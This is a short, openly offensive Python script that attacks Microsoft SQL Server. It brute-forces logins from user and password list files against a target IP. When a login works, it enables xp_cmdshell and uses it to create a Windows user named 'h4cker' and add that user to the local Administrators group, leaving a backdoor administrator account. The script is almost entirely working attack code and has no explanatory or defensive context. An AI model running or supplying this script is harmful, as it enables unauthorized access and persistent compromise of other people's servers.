#!/usr/bin/env python

import sys
from pymssql import _mssql

passwords = open("pass.txt", "r")
users = open("user.txt", "r")
ip = sys.argv[1]

for user in users:
    user = user.rstrip() 
    passwords.seek(0)
    for password in passwords:
        password = password.rstrip() 
        try:
            mssql = _mssql.connect(ip, user, password)
            
            print(f"[ * ] Successful login with username {user} and password: {password}")
            print(f"[ * ] Enabling 'xp_cmdshell'")
            mssql.execute_query("EXEC sp_configure 'show advanced options', 1;RECONFIGURE;\
                    exec sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
            mssql.execute_query("RECONFIGURE;")

            print(f"[ * ] Adding Administrators group user")
            mssql.execute_query("xp_cmdshell 'net user h4cker Password! /ADD && \
                    net localgroup administrators h4cker /ADD'")
            mssql.close()

            print(f"[ * ] Success!")
            break
        except:
            print(f"[ ! ] Falied login for user {user} and password: {password}")
